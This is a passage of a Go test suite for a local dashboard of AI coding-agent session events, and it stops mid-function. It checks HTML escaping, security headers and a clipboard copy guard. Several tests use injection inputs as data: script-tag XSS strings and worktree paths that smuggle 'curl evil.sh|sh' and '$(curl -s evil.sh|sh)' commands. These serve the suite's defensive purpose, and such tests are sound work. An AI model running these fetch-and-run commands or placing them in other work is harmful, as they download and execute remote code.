package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode"
)

func TestRowClass(t *testing.T) {
	// rowClass assembles the roster <tr> class list from three independent flags;
	// pin every combination so a template/CSS rename can't silently drift from it.
	cases := []struct {
		name              string
		rank              int
		groupStart, group bool
		want              string
	}{
		{"plain", 5, false, false, ""},
		// Zero-value Agent: StatusRank 0 is the most severe rank (<= 1), so a
		// default-initialised row reads as alert. Pins the rank-0 boundary in case a
		// future by-value Agent{} ever reaches rowClass.
		{"zero value (rank 0)", 0, false, false, "alert"},
		{"alert only", 1, false, false, "alert"},
		{"group-start only", 5, true, false, "group-start"},
		{"grouped only", 5, false, true, "grouped"},
		{"alert+grouped", 0, false, true, "alert grouped"},
		{"group-start+grouped", 5, true, true, "group-start grouped"},
		{"all three", 1, true, true, "alert group-start grouped"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := rowClass(Agent{StatusRank: c.rank, GroupStart: c.groupStart, Grouped: c.group})
			if got != c.want {
				t.Errorf("rowClass(rank=%d groupStart=%v grouped=%v) = %q, want %q", c.rank, c.groupStart, c.group, got, c.want)
			}
		})
	}
}

func TestHandleDashboard_RendersAndFilters(t *testing.T) {
	db, err := openDB(filepath.Join(t.TempDir(), "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "other", EventType: "SessionStart", Summary: "SessionStart", PayloadJSON: "{}"})

	// No filter: both source apps present.
	body := getBody(t, db, "/")
	if !strings.Contains(body, "Bash: git status") || !strings.Contains(body, "SessionStart") {
		t.Errorf("dashboard missing events:\n%s", body)
	}

	// Filter by source_app.
	body = getBody(t, db, "/?source_app=other")
	if strings.Contains(body, "Bash: git status") {
		t.Errorf("source filter leaked myapp event:\n%s", body)
	}
	if !strings.Contains(body, "SessionStart") {
		t.Errorf("source filter dropped matching event:\n%s", body)
	}
}

func TestHandleDashboard_EscapesHTML(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", Summary: `<script>alert(1)</script>`, PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if strings.Contains(body, "<script>alert(1)</script>") {
		t.Errorf("summary was not HTML-escaped:\n%s", body)
	}
	if !strings.Contains(body, "&lt;script&gt;") {
		t.Errorf("expected escaped summary in output:\n%s", body)
	}
}

// The roster's branch cell is a click-to-copy control for the session's worktree
// path. These pin the three states that matter: a live session with a cwd, one
// without, and the escaping of a hostile path.
func TestHandleDashboard_RosterBranchCopiesCwd(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-copy", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "1 live") {
		t.Fatalf("expected a roster row to render (nothing to assert on otherwise):\n%s", body)
	}
	if !strings.Contains(body, `class="copycwd"`) {
		t.Errorf("roster branch cell has no copy button:\n%s", body)
	}
	if !strings.Contains(body, `data-cwd="/home/me/wt/fix-71"`) {
		t.Errorf("copy button does not carry the session cwd:\n%s", body)
	}
}

func TestHandleDashboard_RosterBranchWithoutCwd(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		SessionID: "sess-nocwd", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "1 live") {
		t.Fatalf("expected a roster row to render:\n%s", body)
	}
	// The bare class name also appears in the page's CSS and JS, so match the
	// rendered attribute.
	if strings.Contains(body, `class="copycwd"`) {
		t.Errorf("cwd-less row must not offer a copy button:\n%s", body)
	}
	if !strings.Contains(body, "fix-71") {
		t.Errorf("branch name dropped along with the button:\n%s", body)
	}
}

// The cwd reaches three separate attributes, so each is asserted on its own: a
// whole-body scan would still pass if data-cwd escaped and title did not.
func TestHandleDashboard_EscapesCwd(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: `/tmp/"><script>alert(1)</script>`,
		SessionID: "sess-xss", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `class="copycwd"`) {
		t.Fatalf("expected the copy button to render:\n%s", body)
	}
	if strings.Contains(body, "<script>alert(1)</script>") {
		t.Errorf("cwd was not HTML-escaped:\n%s", body)
	}
	// Scope to the button's own tag: title and aria-label appear elsewhere on the
	// page, and a whole-body search would happily match one of those instead.
	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
	if tag == "" {
		t.Fatalf("could not isolate the copy button tag:\n%s", body)
	}
	// Each attribute must have closed at its own quote, with the cwd's own quote
	// and angle brackets escaped inside it — that is what proves the value could
	// not break out of that specific attribute.
	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
		if m == nil {
			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
			continue
		}
		if !strings.Contains(m[1], "&lt;script&gt;") {
			t.Errorf("%s = %q, want the cwd's angle brackets escaped", attr, m[1])
		}
		if !strings.Contains(m[1], "&#34;") {
			t.Errorf("%s = %q, want the cwd's double quote escaped", attr, m[1])
		}
	}
}

// The button carries the accessibility contract for the copy affordance: a name
// of its own (it replaces its inner text for assistive tech), a decorative glyph
// hidden from it, and a live region to announce into.
func TestHandleDashboard_CopyButtonAccessibility(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-a11y", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `aria-label="fix-71 — copy worktree path /home/me/wt/fix-71"`) {
		t.Errorf("copy button is missing its accessible name:\n%s", body)
	}
	if !strings.Contains(body, `<span class="copyicon" aria-hidden="true">`) {
		t.Errorf("the ⧉ glyph must be hidden from assistive tech:\n%s", body)
	}
	if !strings.Contains(body, `id="ck-copystatus" class="ck-sr" role="status"`) {
		t.Errorf("copy live region missing:\n%s", body)
	}
	// The path is on hover too — issue #71 asks for it explicitly.
	if !strings.Contains(body, `title="/home/me/wt/fix-71"`) {
		t.Errorf("copy button lost the hover title:\n%s", body)
	}
}

// The ⧉ is transparent at rest, which makes the rules that bring it BACK
// load-bearing rather than cosmetic. A keyboard copy never hovers, and a mouse
// copy is routinely followed by the pointer leaving the row well inside the
// 1.2s flash window — so if either flash class stops outranking the resting
// opacity, the ✓/✗ confirmation goes silent for sighted users while every other
// test here (which only asserts the glyph's markup and its colour classes) keeps
// passing. Touch is the mirror case: with no hover to reveal on, the glyph is
// the only thing marking the cell as a control, so it must stay visible there.
func TestDashboardCopyIcon_TransparentAtRestButForcedBackWhenItMatters(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")

	if !regexp.MustCompile(`\.copyicon\s*\{[^}]*\bopacity:\s*0\b`).MatchString(body) {
		t.Error(".copyicon lost its resting opacity: 0 — the glyph is back on every roster row")
	}

	var reveal string
	for _, m := range regexp.MustCompile(`([^{}]*)\{\s*opacity:\s*1;\s*\}`).FindAllStringSubmatch(body, -1) {
		reveal += m[1]
	}
	for _, sel := range []string{
		"tr:hover .copyicon",               // pointer discoverability
		".copycwd:focus-visible .copyicon", // keyboard discoverability
		".copycwd.copied .copyicon",        // success confirmation
		".copycwd.copyfail .copyicon",      // refused/failed copy
	} {
		if !strings.Contains(reveal, sel) {
			t.Errorf("%q no longer forces the glyph visible; reveal selectors are: %q", sel, reveal)
		}
	}

	if !regexp.MustCompile(`@media \(hover: none\)\s*\{\s*\.copyicon\s*\{[^}]*\bopacity:\s*1\b`).MatchString(body) {
		t.Error("touch devices have no hover to reveal on; .copyicon must stay visible under @media (hover: none)")
	}
}

// On a grouped row that HAS a copy button, "(cluster)" must live in the button's
// own aria-label. A button's aria-label replaces its accessible name outright, so
// a sibling span carrying the note is silent to anyone tabbing control-to-control
// — and emitting both would make browse mode say it twice. Exactly one carrier.
func TestHandleDashboard_ClusterSuffixComposesWithCopyButton(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	// Two live sessions on one (source_app, branch) make a cluster.
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-c1", EventType: "Stop", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-c2", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "2 live") {
		t.Fatalf("expected two roster rows to form a cluster:\n%s", body)
	}
	// The button's OWN accessible name, parallel to how (mid-rebase) is folded in.
	want := `aria-label="fix-71 (cluster) — copy worktree path /home/me/wt/fix-71"`
	if n := strings.Count(body, want); n != 2 {
		t.Errorf("expected both grouped rows' buttons to be named %s, got %d, in:\n%s", want, n, body)
	}
	// ...and not ALSO in a sibling span, which would double the announcement.
	if strings.Contains(body, `<span class="ck-sr"> (cluster)</span>`) {
		t.Errorf("grouped row with a copy button must not also emit the sibling span:\n%s", body)
	}
	// Never a name on the cell itself: that would replace the button, not compose.
	if strings.Contains(body, `<td class="branch" data-label="branch" aria-label`) {
		t.Errorf("cluster suffix must not be an aria-label on the cell:\n%s", body)
	}
	if !strings.Contains(body, `class="copycwd"`) {
		t.Errorf("grouped row lost its copy button:\n%s", body)
	}
	// The poller carries keyboard focus across its #content swap by matching the
	// button's data-session, so a cluster — two sessions, one identical cwd — is
	// exactly where a data-cwd key would land focus on the wrong row. The two
	// buttons must therefore carry DISTINCT session keys, and row order inside a
	// cluster is not stable between polls, so this is the only thing that keeps
	// focus on the row the user was actually on.
	keys := regexp.MustCompile(`data-session="([^"]*)"`).FindAllStringSubmatch(body, -1)
	if len(keys) != 2 {
		t.Fatalf("expected both clustered buttons to carry data-session, got %d, in:\n%s", len(keys), body)
	}
	if keys[0][1] == keys[1][1] || keys[0][1] == "" {
		t.Errorf("clustered rows must carry distinct non-empty session keys, got %q and %q",
			keys[0][1], keys[1][1])
	}
}

// The mirror image: a grouped row with NO cwd has no button to carry the note, so
// the visually-hidden sibling span stays its carrier. Both halves of the rule
// have to hold, or one of them silently becomes the only case that works.
func TestHandleDashboard_ClusterSuffixWithoutCopyButton(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		SessionID: "sess-n1", EventType: "Stop", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		SessionID: "sess-n2", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if strings.Contains(body, `class="copycwd"`) {
		t.Fatalf("cwd-less rows must not render a copy button:\n%s", body)
	}
	if n := strings.Count(body, `<span class="ck-sr"> (cluster)</span>`); n != 2 {
		t.Errorf("expected 2 sibling cluster spans on the button-less rows, got %d, in:\n%s", n, body)
	}
}

// Mid-rebase state reaches the button's own name, since that name replaces the
// 🚧 glyph's label for anyone who tabs to the control.
func TestHandleDashboard_CopyButtonLabelsRebase(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Rebasing: true, Cwd: "/home/me/wt/fix-71",
		SessionID: "sess-rebase", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, `aria-label="fix-71 (mid-rebase) — copy worktree path /home/me/wt/fix-71"`) {
		t.Errorf("mid-rebase state missing from the button label:\n%s", body)
	}
}

// Control characters must never reach the copy target: html/template does not
// escape a newline in an attribute value, so one would ride the clipboard into a
// terminal as a command terminator. buildEvent strips them on the way in, which
// is what this exercises end to end.
//
// Only the control characters are stripped — the pipe survives into the
// attribute, deliberately, because | is legal in a directory name and removing
// it would corrupt a real path. Nothing shell-active is ever copied all the
// same: the client's allowlist refuses the whole value (see
// TestDashboardCopyGuard_PathAllowlist, which pins this exact string).
func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	raw := []byte(`{"session_id":"sess-ctrl","hook_event_name":"Stop","cwd":"/home/me/wt\ncurl evil.sh|sh\u0007\t"}`)
	if err := insertEvent(db, buildEvent(raw, "myapp")); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("expected a copy button to render:\n%s", body)
	}
	if got, want := m[1], "/home/me/wtcurl evil.sh|sh"; got != want {
		t.Errorf("data-cwd = %q, want %q", got, want)
	}
	if strings.ContainsFunc(m[1], unicode.IsControl) {
		t.Errorf("control character survived into data-cwd: %q", m[1])
	}
}

// Rows written before ingest started stripping control characters are still in
// the database, so the read path strips too. Inserting the Event DIRECTLY —
// bypassing buildEvent — is the point: it is the only way to produce the legacy
// shape, and the only thing that distinguishes this from the test above. All
// three attributes the cwd reaches are checked, not just the copy target: the
// client's copy guard defends the clipboard alone, so title and aria-label have
// no second line of defence.
func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71",
		Cwd:       "/home/me/wt\ncurl evil.sh|sh\x07\t",
		SessionID: "sess-legacy", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
	if tag == "" {
		t.Fatalf("expected a copy button to render:\n%s", body)
	}
	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
		if m == nil {
			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
			continue
		}
		if strings.ContainsFunc(m[1], unicode.IsControl) {
			t.Errorf("control character survived into %s: %q", attr, m[1])
		}
		if !strings.Contains(m[1], "/home/me/wtcurl evil.sh|sh") {
			t.Errorf("%s = %q, want the cwd with only its control characters removed", attr, m[1])
		}
	}
}

// The read path re-applies the length cap as well as the control-character
// strip. Both exist for the same rows — written before cwd had either — and an
// oversized one would otherwise be rendered three times per roster row on every
// render and every poll. Inserted directly, bypassing buildEvent, which is the
// only way to produce the legacy shape.
func TestHandleDashboard_LegacyOversizedCwdIsCappedOnRead(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	long := "/home/me/" + strings.Repeat("a", maxPathLen)
	if err := insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: long,
		SessionID: "sess-long", EventType: "Stop", PayloadJSON: "{}"}); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("expected a copy button to render:\n%s", body)
	}
	if n := len([]rune(m[1])); n != maxPathLen+1 { // +1 for the ellipsis truncate appends
		t.Errorf("data-cwd is %d runes, want the %d-rune cap plus an ellipsis", n, maxPathLen)
	}
	// ...and the ellipsis is what makes the client's 'truncated' refusal fire.
	if !strings.HasSuffix(m[1], "…") {
		t.Errorf("capped cwd should end in an ellipsis, got %q", m[1][len(m[1])-8:])
	}
}

// The scrub layer fails closed, so a real path segment shaped like a credential
// comes back as «redacted» and the stored cwd is no longer a path. The server
// still renders the row — the branch, the status, the hover title are all worth
// showing — but the client must refuse to put that value on the clipboard rather
// than hand over a directory that does not exist. This pins both halves the
// server can see: the redacted value reaching the button, and the guard being
// present in the script that reads it.
func TestHandleDashboard_RedactedCwdIsRefusedByTheCopyGuard(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	raw := []byte(`{"session_id":"sess-red","hook_event_name":"Stop","cwd":"/home/me/wt/api-key=v1/fix-71"}`)
	ev := buildEvent(raw, "myapp")
	ev.TS = ts
	if !strings.Contains(ev.Cwd, redacted) {
		t.Fatalf("expected the scrub layer to redact this path shape, got %q", ev.Cwd)
	}
	if err := insertEvent(db, ev); err != nil {
		t.Fatal(err)
	}

	body := getBody(t, db, "/")
	if !strings.Contains(body, redacted) {
		t.Errorf("the redacted cwd should still render (the row is worth showing):\n%s", body)
	}
	// The refusal itself lives in the client, so what the server can assert is
	// that the guard is shipped and wired into the click handler. All three
	// branches are pinned, not just the one this row exercises: a simplification
	// that dropped the ellipsis disjunct would let a truncated path be copied as
	// a broken path with the suite still green. So are the three messages —
	// their whole point is that each cause is described accurately.
	for _, frag := range []string{
		`function unusableReason(s) {`,
		`if (s.indexOf('` + redacted + `') !== -1) return 'redacted';`,
		`if (s.charAt(s.length - 1) === '…') return 'truncated';`,
		`if (pathAllow.test(s)) return 'unsafe';`,
		`var path = btn.getAttribute('data-cwd') || '';`,
		`var why = ctrlChars.test(path) ? 'unsafe' : unusableReason(path);`,
		`flash(btn, false, unusableMsg[why]);`,
		`redacted: 'part of this path was redacted — not copied',`,
		`truncated: 'this path was too long and got cut off — not copied',`,
		`unsafe: 'this path contains shell characters — not copied'`,
	} {
		if !strings.Contains(body, frag) {
			t.Errorf("copy guard fragment missing from the page: %s", frag)
		}
	}
}

// pathAllowJS is the copy guard's allowlist exactly as it appears inside
// new RegExp('…') in dashboard.html, and pathAllowGo is the same pattern with
// the JS string escaping undone. Go's regexp gives \p{L}/\p{M}/\p{N} the same
// meaning JS does under /u, so compiling it here exercises the real character
// class. Asserting the JS form is present in the page keeps the two in step: a
// change to the template that this test does not follow fails it.
const pathAllowJS = `[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]`

var pathAllowGo = regexp.MustCompile(strings.ReplaceAll(pathAllowJS, `\\`, `\`))

// The same, for the ES5 fallback the guard installs on an engine without
// Unicode property escapes. It is pinned because it is the pattern those older
// engines actually run: widening this class to quiet a false positive would
// break the refusal on exactly the engines the fallback exists for, and nothing
// else in the suite would notice. Only the \uXXXX escapes need translating.
const pathAllowFallbackJS = `[^-A-Za-z0-9 /._+=,:@~%\\u0080-\\uFFFF]`

var pathAllowFallbackGo = regexp.MustCompile(strings.NewReplacer(
	`\\u0080`, `\x{0080}`, `\\uFFFF`, `\x{FFFF}`).Replace(pathAllowFallbackJS))

// The allowlist has to refuse everything a shell would act on, and it has to
// stay out of the way of ordinary paths. The second half matters as much as the
// first: refusing spaces or non-ASCII names would make the button useless on a
// Mac or on anyone's non-English filesystem, which is a worse outcome than the
// attack it defends against.
func TestDashboardCopyGuard_PathAllowlist(t *testing.T) {
	safe := []string{
		"/home/me/wt/fix-71",
		"/Users/me/Library/Application Support/Claude",      // spaces are ordinary
		"/home/mé/Ünïcode/プロジェクト/仕事",                        // non-ASCII letters must copy
		"/home/me/Δοκιμή/проект/מסמכים",                     // more scripts, incl. RTL
		"/home/me/v1.2+build=3,rev:4@host~tmp/100%_done-ok", // every permitted punctuation mark
		"/",
	}
	// Both patterns, always: the fallback is what pre-2018 engines run, and a
	// divergence between the two is a hole that only opens on those engines.
	pats := map[string]*regexp.Regexp{
		"unicode property escapes": pathAllowGo,
		"ES5 fallback":             pathAllowFallbackGo,
	}
	for which, re := range pats {
		for _, p := range safe {
			if re.MatchString(p) {
				t.Errorf("%s allowlist refuses an ordinary path: %q (offending char %q)",
					which, p, re.FindString(p))
			}
		}
	}

	unsafe := map[string]string{
		"command substitution": "/home/me/proj$(curl -s evil.sh|sh)",
		"backtick":             "/home/me/proj`id`",
		"semicolon":            "/home/me/proj;id",
		"pipe":                 "/home/me/wtcurl evil.sh|sh",
		"ampersand":            "/home/me/proj&id",
		"redirect out":         "/home/me/proj>out",
		"redirect in":          "/home/me/proj<in",
		"double quote":         `/home/me/pro"j`,
		"single quote":         "/home/me/pro'j",
		"backslash":            `/home/me/pro\j`,
		"glob star":            "/home/me/proj*",
		"glob question":        "/home/me/proj?",
		"bracket":              "/home/me/pro[j]",
		"brace":                "/home/me/pro{j}",
		"history bang":         "/home/me/proj!",
		"comment hash":         "/home/me/proj#x",
		"newline":              "/home/me/proj\nid",
	}
	for which, re := range pats {
		for name, p := range unsafe {
			if !re.MatchString(p) {
				t.Errorf("%s allowlist permits a shell-active path (%s): %q", which, name, p)
			}
		}
	}
}

// The pattern the test above exercises must be the one the page actually ships.
func TestHandleDashboard_ShipsThePathAllowlist(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")
	if !strings.Contains(body, `new RegExp('`+pathAllowJS+`', 'u')`) {
		t.Errorf("the page does not ship the allowlist this suite tests: %s", pathAllowJS)
	}
	if !strings.Contains(body, `new RegExp('`+pathAllowFallbackJS+`')`) {
		t.Errorf("the page does not ship the fallback allowlist this suite tests: %s", pathAllowFallbackJS)
	}
}

// Two ways the copy button can fail a keyboard user, both of which cost nothing
// to keep pinned. The drag-selection guard must not run on keyboard activation
// (Enter does not collapse a selection made earlier elsewhere, so a
// document-wide guard would swallow the copy with no flash and no
// announcement), and the poller must carry focus across its #content swap
// rather than drop it to <body> mid-interaction. The refocus key is the session
// id (a cluster shares one cwd, so a path key would restore to the wrong row)
// and the focus call must pass preventScroll (rows move between polls, and
// refocusing must not yank a viewport the user did not scroll).
func TestHandleDashboard_CopyButtonSurvivesKeyboardUseAndRefresh(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	body := getBody(t, db, "/")
	for _, frag := range []string{
		`if (ev.detail !== 0) {`,
		`sel.containsNode(btn, true)`,
		`function swapContent(html) {`,
		`active.closest('#content .copycwd')`,
		`var key = keep ? keep.getAttribute('data-session') : null;`,
		`if (btns[i].getAttribute('data-session') === key) { btns[i].focus({ preventScroll: true }); return; }`,
		`document.dispatchEvent(new CustomEvent('ch:contentswap'))`,
		`document.addEventListener('ch:contentswap', unflash);`,
		`swapContent(d.html);`,
	} {
		if !strings.Contains(body, frag) {
			t.Errorf("copy-button a11y fragment missing from the page: %s", frag)
		}
	}
}

// The copy affordance is roster-only by design: the activity and recent-events
// branch cells share branchcell, which must stay a plain <td>. A session-less
// event lands in both of those tables but never on the roster.
func TestHandleDashboard_NonRosterBranchCellsHaveNoCopyButton(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
		EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "0 live") {
		t.Fatalf("session-less event should not reach the roster:\n%s", body)
	}
	if !strings.Contains(body, "Activity (last 30 min)") || !strings.Contains(body, "Bash: git status") {
		t.Fatalf("expected the activity and recent-events tables to render:\n%s", body)
	}
	if strings.Contains(body, `class="copycwd"`) {
		t.Errorf("copy button leaked outside the roster:\n%s", body)
	}
}

func TestHandleDashboard_RendersActivity(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "fix-2499", EventType: "PreToolUse", PayloadJSON: "{}"})
	insertEvent(db, Event{TS: now, SourceApp: "myapp", Branch: "fix-2499", EventType: "Stop", PayloadJSON: "{}"})

	body := getBody(t, db, "/")
	if !strings.Contains(body, "Activity (last 30 min)") {
		t.Errorf("activity section missing:\n%s", body)
	}
}

func TestHandleState_ReturnsSignatureAndHTML(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", Summary: "Bash: git status", PayloadJSON: "{}"})

	req := httptest.NewRequest(http.MethodGet, "/api/state", nil)
	rec := httptest.NewRecorder()
	handleState(rec, req, db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	var resp struct {
		Signature string `json:"signature"`
		HTML      string `json:"html"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v\nbody: %s", err, rec.Body.String())
	}
	if resp.Signature == "" {
		t.Error("empty signature")
	}
	if !strings.Contains(resp.HTML, "Bash: git status") {
		t.Errorf("fragment missing event:\n%s", resp.HTML)
	}
	// The fragment is the dynamic region only — no surrounding page chrome.
	if strings.Contains(resp.HTML, "<form") || strings.Contains(resp.HTML, "<script") {
		t.Errorf("fragment leaked page chrome:\n%s", resp.HTML)
	}
	// The copy live region must stay OUTSIDE #content, which this fragment
	// replaces wholesale. A re-created live region is a NEW region to assistive
	// tech and its text is not announced — a silent, invisible regression.
	if strings.Contains(resp.HTML, "ck-copystatus") {
		t.Errorf("copy live region moved inside the swapped region:\n%s", resp.HTML)
	}
}

func TestBuildDashboardDataMergeFlags(t *testing.T) {
	db, err := openDB(filepath.Join(t.TempDir(), "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	ci := newCICache()
	peek := &peekConfig{}
	cfg := &actionConfig{enabled: true, token: "tok"}
	r := httptest.NewRequest(http.MethodGet, "/", nil)
	data, err := buildDashboardData(r, db, ci, peek, cfg)
	if err != nil {
		t.Fatal(err)
	}
	if !data.MergeEnabled || data.CSRFToken != "tok" {
		t.Fatalf("MergeEnabled=%v CSRFToken=%q", data.MergeEnabled, data.CSRFToken)
	}
}

// Both routes carry the hardening headers. The framing one has teeth: the
// clipboard fallback used on a non-secure origin still copies inside a frame,
// so a framed dashboard is a usable decoy.
func TestHandlers_SetSecurityHeaders(t *testing.T) {
	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
	defer db.Close()
	now := time.Now().UTC().Format(time.RFC3339)
	insertEvent(db, Event{TS: now, SourceApp: "myapp", EventType: "PreToolUse", ToolName: "Bash", PayloadJSON: "{}"})

	routes := map[string]func(http.ResponseWriter, *http.Request, *sql.DB, *ciCache, *peekConfig, *actionConfig){
		"/":          handleDashboard,
		"/api/state": handleState,
	}
	want := map[string]string{
		"X-Frame-Options":         "DENY",
		"X-Content-Type-Options":  "nosniff",
		"Referrer-Policy":         "no-referrer",
		"Content-Security-Policy": "frame-ancestors 'none'; base-uri 'none'; object-src 'none'",
	}
	for target, h := range routes {
		rec := httptest.NewRecorder()
		h(rec, httptest.NewRequest(http.MethodGet, target, nil), db, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
		if rec.Code != http.StatusOK {
			t.Fatalf("%s: status=%d", target, rec.Code)
		}
		for k, v := range want {
			if got := rec.Header().Get(k); got != v {
				t.Errorf("%s: %s = %q, want %q", target, k, got, v)
			}
		}
	}

	// The error path has to carry them too. http.Error writes the response, so a
	// handler that set headers only after a successful query would ship its 500
	// unframed — which is the response an attacker can most easily provoke.
	closed, _ := openDB(filepath.Join(t.TempDir(), "closed.db"))
	closed.Close()
	for target, h := range routes {
		rec := httptest.NewRecorder()
		h(rec, httptest.NewRequest(http.MethodGet, target, nil), closed, newCICache(), &peekConfig{cache: newPaneCache()}, &actionConfig{})
		if rec.Code != http.StatusInternalServerError {
			t.Fatalf("%s: a closed DB should 500, got %d", target, rec.Code)
		}
		for k, v := range want {
			if got := rec.Header().Get(k); got != v {
				t.Errorf("%s (500): %s = %q, want %q", target, k, got, v)
			}
		}
	}
}

func TestViewSignature_IgnoresIdleButTracksEvents(t *testing.T) {
	base := dashboardData{
